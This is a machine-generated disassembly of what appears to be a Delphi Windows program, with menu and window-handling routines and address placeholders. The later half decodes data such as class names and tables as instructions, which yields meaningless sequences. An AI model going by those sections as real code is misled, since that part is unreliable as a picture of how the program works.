test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_452974
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4528e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45151c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4529cc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44d818
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_452188
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452188
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_452a14
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44d818
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45d9f4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403468
mov edx eax
jmp r-xdata
sub_452a60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_41256c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_4529cc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_450dd4
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4512d0
mov eax [ ebx + 0x34 ]
call sub_44e678
mov eax ebx
call sub_451c78
mov eax ebx
call sub_452a14
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44e7a8
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_452b14
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139c8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4139c8
cmp ebp [ eax ]
jne r-xdata
sub_452b50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41ce60
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c694
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41ce60
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c694
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403468
mov edx [ r-xdata ]
call sub_4033f8
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41ce60
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c694
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_452c38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404010
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40427c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_40451c
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40427c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_40451c
jmp r-xdata
sub_452ccc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403fbc
mov ebx 0x1
mov eax esi
call sub_40427c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4041a4
sub_452d30
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452d89
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452c38
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_452c38
mov eax [ ebp - 0x8 ]
pop edx
call sub_407d64
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452d90
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_452e9c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d68
mov eax [ r-xdata ]
call sub_413204
mov eax [ r-xdata ]
call sub_4132a4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
mov eax [ r-xdata ]
call sub_413148
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423a8c
mov [ rw-data ] eax
sub_453134
in al dx
inc ebp
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp [ eax + 0x64 ]
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bl
xor al [ ebp ]
or [ edi + 0x73 ] dh
dec esi
outsd
jb r-xdata
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax + 0x6d ] al
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
inc [ ebp + ebp * 2 + 0x45 ]
add [ eax ] ah
outsb
inc ebp
add [ esi + ebp * 2 + 0x45 ] al
add al bl
outsb
inc ebp
add [ ebp * 2 + 0x687c0045 ] bl
inc ebp
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ eax + 0x6e ] ch
inc ebp
add [ eax + ebp * 2 ] bh
inc ebp
add [ eax - 0x13ffbbe5 ] bl
inc ebp
add [ eax - 0x3ffbbe8 ] al
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
add [ eax ] dl
push edx
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
push esi
jb r-xdata
outsd
insb
nop
shl [ ebx ] 0x45
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
xchg esp eax
rol [ ebx ] cl
in al dx
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
lodsb [ esi ]
xor al [ ebp ]
mov al [ 0xd0043a1 ]
add [ 0x6d726f46 ] al
jae r-xdata
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax ] bh
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
jae r-xdata
add [ eax + 0x10004567 ] dh
jb r-xdata
or [ gs : edx + 0x73 ] ah
xor al 0x45
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
xor [ ebp ] al
or [ edx ] al
add bh bh
hlt
add [ eax ] dh
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
or al 0x65
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edx + esi ] bl
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
mov al 0x67
inc ebp
shr [ edx + esi + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx ] 0x45
add [ esi + 0x1c004533 ] ah
add al [ eax ]
add ah ch
popfd
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax + 0x6d ] al
inc ebp
add [ edx ] al
add [ eax + eax + 0x702cb010 ] al
inc ebp
add [ eax + esi * 2 ] dh
inc ebp
add [ edx ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
js r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
push edx
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
mov al 0x67
inc ebp
add [ eax ] dl
je r-xdata
add [ eax ] cl
inc ebp
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
xor al 0x45
add [ 0x6d726f46 ] al
inc edx
outsd
and [ edx ] dh
inc eax
jae r-xdata
lea eax [ eax ]
adc al 0x35
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x38000000 ] al
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ eax + 0x6e ] ch
inc ebp
add [ eax + ebp * 2 ] bh
inc ebp
add [ eax - 0x37ffbbe5 ] bl
outsd
inc ebp
add [ eax - 0x3ffbbe8 ] al
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
inc eax
add [ eax ] cl
inc ebp
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
add al ch
xor eax 0x35f60045
inc ebp
add [ edx + eax ] ah
add [ eax ] al
pushad
xor al [ ebp ]
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
xor al 0x45
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x38000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi ] dh
inc ebp
jb r-xdata
jb r-xdata
xor al 0x45
jb r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
insb
insb
inc edx
outsd
js r-xdata
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0x6f ] ch
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
fwait
jae r-xdata
mov ah 0x9c
outsd
push ebx
arpl [ edx + 0x6f ] si
add [ ebx ] bl
add bh bh
fcom st3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410500
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
xor eax 0x33bc0045
inc ebp
add [ eax + eax + 0x5 ] al
inc esi
outsd
jb r-xdata
add [ eax + 0x42080016 ] al
insb
dec edi
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
or al 0x54
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
jae r-xdata
test al 0x1
add bh bh
aam 0x32
inc esp
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
sbb [ eax + 0x45 ] dh
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al bh
xchg [ ebx ] al
pop ebx
add [ eax ] al
add [ eax ] ah
add al [ eax ]
[ eax ]
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x34a06564
inc ebp
inc ebx
add [ edx ] bh
hlt
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
xor al 0x45
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc edx
or [ edx + 0x65 ] eax
jbe r-xdata
popfd
inc ebx
add [ ebp + 0x1 ] ah
add bh bh
adc [ esp + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xa0ff0001
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
insb
insb
add [ eax ] dl
inc eax
outsd
pushfd
inc ebx
add [ ebx + 0x1 ] ah
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_457b58
add [ eax ] al
add [ eax ] 0x0
add bh bh
push eax
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc eax
popfd
inc ebx
add [ edx + 0x1 ] ah
inc ebx
add [ ecx + eax ] ah
dec [ esp + edx * 2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
pushfd
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
jpe r-xdata
je r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
jmp [ eax + 0x43 ]
jae r-xdata
add [ eax ] al
inc [ ecx ]
insb
enter 0x438e 0x0
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
loopne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax - 0x2b00ffff ] ch
xor al [ eax + eax + 0x1 ]
add bh bh
loopne r-xdata
jb r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ eax + 0x43e0 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
sub_4541cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x45 ] al
add [ esp + eax * 2 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ ebx + 0x45 ]
add [ edx - 0x7ffbabc ] bl
add al [ eax ]
add [ eax + 0x32 ] ah
inc ebp
add al dh
0x71ec0041 0x45
mov al [ 0xffffffffc8004573 ]
xor al 0x40
add [ eax + ebx * 4 ] cl
inc ebp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
or [ ebp + eax * 2 ] dh
adc [ edx + 0x44 ] dl
add [ eax + 0x79 ] bh
inc ebp
add [ edi + edi + 0x75c80041 ] al
inc ebp
add [ esi + esi * 2 ] al
inc ebp
add [ eax ] dl
ja r-xdata
xchg esp eax
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add [ eax - 0x17ffba81 ] cl
xchg edi eax
inc ecx
add [ eax ] ch
mov ebx 0x70600045
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax + 0x68004447 ] ah
jl r-xdata
push 0x6c00456e
xchg [ ebp ] al
cwde
sbb eax [ eax + eax + 0x30 ]
xchg ebx eax
inc ebp
add [ eax + 0x4c004596 ] dl
xchg ebp eax
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add al cl
xchg edi eax
inc ebp
add [ edx + ebx + 0x470c0044 ] dl
inc esp
add [ esi + ebx * 4 + 0x59000045 ] bh
inc esp
add [ eax - 0x2fffbbbd ] cl
mov bl 0x45
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax - 0x13ffba5c ] dh
je r-xdata
fadd [ ebx ]
int3
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ebp + edi * 2 + 0x45 ] bl
add al cl
add [ eax + eax - 0x6c ] eax
daa
add [ eax + 0x75 ] ch
inc ebp
add [ eax + 0x240045b7 ] dh
jb r-xdata
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
pop ss
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ edx + esi * 4 - 0x666bffbb ] dh
inc ebp
add [ eax - 0x4c ] ch
inc ebp
add [ edi + edi * 2 + 0x45 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
or al 0x3e
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
inc eax
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
sub_4544d0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 ] cl
inc ebp
add al bh
add al [ eax ]
add al cl
inc ecx
inc ebp
add al dh
0x71ec0041 0x45
mov al [ 0xffffffffc8004573 ]
xor al 0x40
add [ eax + ebx * 4 ] cl
inc ebp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
or [ ebp + eax * 2 ] dh
adc [ edx + 0x44 ] dl
add [ eax + 0x79 ] bh
inc ebp
add [ edi + edi + 0x75c80041 ] al
inc ebp
add [ esi + esi * 2 ] al
inc ebp
add [ eax ] dl
ja r-xdata
xchg esp eax
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add [ eax - 0x17ffba81 ] cl
xchg edi eax
inc ecx
add [ eax ] ch
mov ebx 0x70600045
inc ebp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax + 0x68004447 ] ah
jl r-xdata
push 0x6c00456e
xchg [ ebp ] al
cwde
sbb eax [ eax + eax + 0x30 ]
xchg ebx eax
inc ebp
add [ eax + 0x4c004596 ] dl
xchg ebp eax
inc ebp
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add al cl
xchg edi eax
inc ebp
add [ edx + ebx + 0x470c0044 ] dl
inc esp
add [ esi + ebx * 4 + 0x59000045 ] bh
inc esp
add [ eax - 0x2fffbbbd ] cl
mov bl 0x45
add [ eax + ebp * 2 + 0x45 ] bl
add [ ebx + ebp * 2 ] cl
inc ebp
add [ eax - 0x13ffba5c ] dh
je r-xdata
fadd [ ebx ]
int3
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ebp + edi * 2 + 0x45 ] bl
add al cl
add [ eax + eax - 0x6c ] eax
add [ eax + eax ] bh
add [ eax + 0x75 ] ch
inc ebp
add [ eax + 0x240045b7 ] dh
jb r-xdata
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov al [ 0x200043a1 ]
add al [ eax ]
push [ eax - 0x68 ]
inc ebp
add al dh
mov al [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x69746341 ] cl
jbe r-xdata
